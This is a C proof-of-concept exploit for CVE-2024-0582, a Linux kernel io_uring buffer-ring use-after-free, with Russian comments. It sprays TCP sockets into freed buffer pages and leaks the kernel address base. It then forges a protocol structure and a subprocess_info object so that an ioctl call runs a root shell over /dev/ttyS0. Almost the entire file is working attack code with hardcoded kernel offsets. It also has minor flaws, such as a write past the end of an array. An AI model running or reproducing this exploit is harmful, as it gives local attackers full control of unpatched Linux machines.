#define _GNU_SOURCE
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include "liburing.h"
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <mqueue.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <assert.h>
#include <err.h>

// Определения констант и смещений
#define DEVICE_TTY "/dev/ttyS0"
#define MEM_PAGE_SIZE 0x1000
#define QUEUE_DEPTH 4
#define SOCK_READABLE_DEFAULT 0xb16b90
#define SOCKET_DATA_READY_OFFSET 680
#define PROTO_STRUCT_OFFSET 1400
#define IOCTL_CMD_OFFSET 40
#define USERMODE_HELPER_EXEC 0xa38f0
#define USERMODE_HELPER_EXEC_WORK 0xa3cb0
#define PROTO_STRUCT_SIZE 432

// Смещения subprocess_info
#define SUBPROC_INFO_WORK_DATA 0
#define SUBPROC_INFO_WORK_ENTRY_NEXT 8
#define SUBPROC_INFO_WORK_ENTRY_PREV 16
#define SUBPROC_INFO_FUNC 24
#define SUBPROC_INFO_PATH 40
#define SUBPROC_INFO_ARGV 48
#define SUBPROC_INFO_ENVP 56
#define SUBPROC_INFO_INIT 72
#define SUBPROC_INFO_CLEANUP 80

#define ALIGNMENT_MASK(x, mask) (((x) + (mask)) & ~(mask))
#define ALIGN_VAL(x, a) ALIGNMENT_MASK(x, (typeof(x)) (a) - 1)

#define L1_CACHE_SHIFT_AMOUNT 6
#define SK_BUFF_SIZE 224
#define SOCK_MIN_SND_BUF (2 * (2048 + ALIGN_VAL(SK_BUFF_SIZE, 1 << L1_CACHE_SHIFT_AMOUNT)))

// Функции-утилиты из liburing
static inline int get_pointer_error(const void *ptr) {
    return (int)(intptr_t)ptr;
}

static inline bool is_pointer_error(const void *ptr) {
    return uring_unlikely((uintptr_t)ptr >= (uintptr_t)-4095UL);
}

// Функция настройки буферного кольца io_uring
static struct io_uring_buf_ring *initialize_buffer_ring(struct io_uring *ring,
                                                        unsigned int num_entries, int buf_group_id,
                                                        unsigned int flags, int *result) {
    struct io_uring_buf_ring *buffer_ring;
    struct io_uring_buf_reg buffer_reg;
    size_t ring_memory_size;
    off_t offset;
    int ret;

    memset(&buffer_reg, 0, sizeof(buffer_reg));
    buffer_reg.ring_entries = num_entries;
    buffer_reg.bgid = buf_group_id;
    buffer_reg.flags = IOU_PBUF_RING_MMAP;

    *result = 0;
    ret = io_uring_register_buf_ring(ring, &buffer_reg, flags);
    if (ret) {
        *result = ret;
        return NULL;
    }

    offset = IORING_OFF_PBUF_RING | (unsigned long long)buf_group_id << IORING_OFF_PBUF_SHIFT;
    ring_memory_size = num_entries * sizeof(struct io_uring_buf);
    buffer_ring = mmap(NULL, ring_memory_size, PROT_READ | PROT_WRITE,
                       MAP_SHARED | MAP_POPULATE, ring->ring_fd, offset);
    if (is_pointer_error(buffer_ring)) {
        *result = get_pointer_error(buffer_ring);
        return NULL;
    }

    return buffer_ring;
}

// Функция для дампа содержимого буфера
void *dump_memory(void *buffer, int size) {
    for (int i = 0; i < (size / 16); i++) {
        uint64_t **line_address;
        line_address = buffer + i * 16;

        // Пропуск строк с нулями
        if (*line_address == 0x0 && *(line_address + 1) == 0x0)
            continue;

        printf("0x%llx: 0x%llx 0x%llx\n", line_address, *line_address, *(line_address + 1));
    }
}

// Поиск значения в буфере
uint64_t find_value_in_buffer(void *buffer, int size, uint64_t value) {
    for (int offset = 0; offset < size; offset += 8) {
        uint64_t **position;
        position = buffer + offset;
        if (*position == value)
            return offset;
    }
    return -1;
}

// Функция для обработки ошибок
void handle_error(char *error_message) {
    puts(error_message);
    exit(1);
}

int main() {
    printf("[*] CVE-2024-0582 PoC by geniuszly\n\n");

    // Установка привязки к ядру процессора
    cpu_set_t cpu_affinity;
    CPU_ZERO(&cpu_affinity);
    CPU_SET(sched_getcpu(), &cpu_affinity);
    if (sched_setaffinity(0, sizeof(cpu_affinity), &cpu_affinity) < 0) {
        perror("sched_setaffinity");
        exit(EXIT_FAILURE);
    }

    // Инициализация io_uring
    struct io_uring uring_instance;
    uint64_t kaslr_base_addr;
    int uring_ret_code;

    uring_ret_code = io_uring_queue_init(QUEUE_DEPTH, &uring_instance, 0);
    if (uring_ret_code < 0) {
        fprintf(stderr, "queue_init: %s\n", strerror(-uring_ret_code));
        return 1;
    }

    // Получение и настройка лимитов дескрипторов файлов
    struct rlimit file_limits;
    getrlimit(RLIMIT_NOFILE, &file_limits);
    file_limits.rlim_cur = file_limits.rlim_max;
    setrlimit(RLIMIT_NOFILE, &file_limits);

    int socket_limit = file_limits.rlim_cur - 20;
    int num_memfds = 0;
    int num_sockets = socket_limit - num_memfds;

    // Инициализация буферного кольца
    int buf_ring_ret;
    int num_pages = 128;
    int num_buffers = 1000;
    void **buffers = calloc(num_buffers, sizeof(*buffers));
    io_uring_queue_init(QUEUE_DEPTH, &uring_instance, 0);

    // Настройка и инициализация буферов io_uring
    for (int i = 0; i < num_buffers; i++) {
        buffers[i] = initialize_buffer_ring(&uring_instance, num_pages * 256, i, 0, &buf_ring_ret);
        io_uring_buf_ring_init(buffers[i]);
    }

    // Освобождение ресурсов буферного кольца
    for (int i = 0; i < num_buffers; i++) {
        buf_ring_ret = io_uring_unregister_buf_ring(&uring_instance, i);
        if (buf_ring_ret)
            printf("Ошибка освобождения буферного кольца %d\n", buf_ring_ret);
    }

    // Настройка сокетов и поиск маркера в буферах
    uint64_t search_marker = 0xdeadbeefdeadbeef;
    int *socket_descriptors = calloc(num_sockets, sizeof(*socket_descriptors));
    for (int i = 0; i < num_sockets; i++) {
        if ((socket_descriptors[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
            handle_error("Ошибка создания сокета");
        if (setsockopt(socket_descriptors[i], SOL_SOCKET, SO_MAX_PACING_RATE, &search_marker, sizeof(uint64_t)) < 0)
            handle_error("Ошибка установки максимальной скорости передачи");
        int buffer_size = socket_descriptors[i] + SOCK_MIN_SND_BUF;
        if (setsockopt(socket_descriptors[i], SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(int)) < 0)
            handle_error("Ошибка установки размера буфера");
    }

    // Поиск и модификация буферов для эксплойта
    for (int i = 0; i < num_buffers; i++) {
        uint64_t search_offset = find_value_in_buffer(buffers[i], num_pages * MEM_PAGE_SIZE, search_marker);
        if (search_offset == -1)
            continue;

        if (*(uint64_t *)(buffers[i] + search_offset) != *(uint64_t *)(buffers[i] + search_offset + 8))
            continue;

        uint64_t sock_offset = search_offset - 456;
        uint64_t sock_addr_in_buffer = buffers[i] + sock_offset;
        printf("Найдено значение 0x%llx по смещению 0x%llx\n", search_marker, search_offset);
        printf("Объект сокета начинается со смещения 0x%llx\n", sock_offset);

        uint64_t kaslr_leak_value;
        kaslr_leak_value = *(uint64_t *)(buffers[i] + sock_offset + SOCKET_DATA_READY_OFFSET);
        printf("kaslr утечка: 0x%llx\n", kaslr_leak_value);
        kaslr_base_addr = kaslr_leak_value - SOCK_READABLE_DEFAULT;
        printf("Базовый адрес kaslr: 0x%llx\n", kaslr_base_addr);

        int socket_id = *(int *)(buffers[i] + sock_offset + 332) / 2 - SOCK_MIN_SND_BUF;
        printf("Найден идентификатор сокета: %d\n", socket_id);

        uint64_t sock_obj_address;
        sock_obj_address = *(uint64_t *)(buffers[i] + sock_offset + 192) - 192;
        printf("Адрес объекта сокета в памяти: 0x%llx\n", sock_obj_address);

        int tcp_sock_size = 2208;
        void *backup_sock_data = malloc(tcp_sock_size);
        memcpy(backup_sock_data, buffers[i] + sock_offset, tcp_sock_size);

        // Подмена структуры протокола для выполнения команды
        uint64_t proto_structure_address = sock_obj_address + PROTO_STRUCT_OFFSET;
        printf("Фейковая структура протокола по адресу: 0x%llx\n", proto_structure_address);
        memcpy(sock_addr_in_buffer + 40, &proto_structure_address, 8);

        uint64_t ioctl_cmd_address = kaslr_base_addr + USERMODE_HELPER_EXEC;
        uint64_t proto_address_in_buffer = sock_addr_in_buffer + PROTO_STRUCT_OFFSET;
        uint64_t proto_ioctl_offset = proto_address_in_buffer + IOCTL_CMD_OFFSET;
        memcpy(proto_ioctl_offset, &ioctl_cmd_address, 8);

        // Подготовка аргументов для выполнения команды
        char *shell_path = "/bin/sh";
        memcpy(proto_address_in_buffer, shell_path, strlen(shell_path) + 1);

        char *arg1 = "-c";
        char *arg2 = malloc(128);
        sprintf(arg2, "/bin/sh &>%s <%s", DEVICE_TTY, DEVICE_TTY);

        uint64_t arg0_addr = proto_structure_address + PROTO_STRUCT_SIZE;
        uint64_t arg1_addr = arg0_addr + 1;
        uint64_t arg2_addr = arg1_addr + strlen(arg1) + 1;
        uint64_t argv[3] = {arg0_addr, arg1_addr, arg2_addr};

        uint64_t argv_offset = arg2_addr - arg0_addr + strlen(arg2) + 1;
        argv_offset = argv_offset + 7 & ~7;
        uint64_t argv_addr_in_buffer = proto_address_in_buffer + PROTO_STRUCT_SIZE + argv_offset;

        memcpy(proto_address_in_buffer + PROTO_STRUCT_SIZE, "", 1);
        memcpy(proto_address_in_buffer + PROTO_STRUCT_SIZE + 1, arg1, strlen(arg1) + 1);
        memcpy(proto_address_in_buffer + PROTO_STRUCT_SIZE + strlen(arg1) + 2, arg2, strlen(arg2) + 1);
        memcpy(argv_addr_in_buffer, &argv, sizeof(argv));

        printf("Аргументы по адресу 0x%llx\n", arg0_addr);
        printf("Вектор аргументов по адресу 0x%llx\n", argv_addr_in_buffer);

        // Настройка структуры subprocess_info в начале структуры сокета
        uint64_t subprocess_info[11] = {0};
        subprocess_info[0] = 0;
        subprocess_info[1] = sock_obj_address + SUBPROC_INFO_WORK_ENTRY_NEXT;
        subprocess_info[2] = sock_obj_address + SUBPROC_INFO_WORK_ENTRY_PREV;
        subprocess_info[3] = kaslr_base_addr + USERMODE_HELPER_EXEC_WORK;
        subprocess_info[5] = proto_structure_address;
        subprocess_info[6] = argv_addr_in_buffer;
        subprocess_info[7] = 0;
        subprocess_info[10] = 0;
        subprocess_info[11] = 0;

        memcpy(sock_addr_in_buffer, &subprocess_info, sizeof(subprocess_info));
        printf("subprocess_info установлена в начале структуры сокета по адресу: 0x%llx\n", sock_obj_address);

        // Вызов ioctl для выполнения команды
        printf("Вызов ioctl...\n");
        ioctl(socket_id, 1337);

        // Восстановление данных сокета после выполнения эксплойта
        memcpy(sock_addr_in_buffer, backup_sock_data, tcp_sock_size);
        break;
    }

    // Закрытие всех сокетов и освобождение ресурсов
    for (int i = 0; i < num_sockets; i++) {
        close(socket_descriptors[i]);
    }

    // Бесконечный цикл для предотвращения завершения программы
    while (1)
        sleep(60);

    return 0;
}
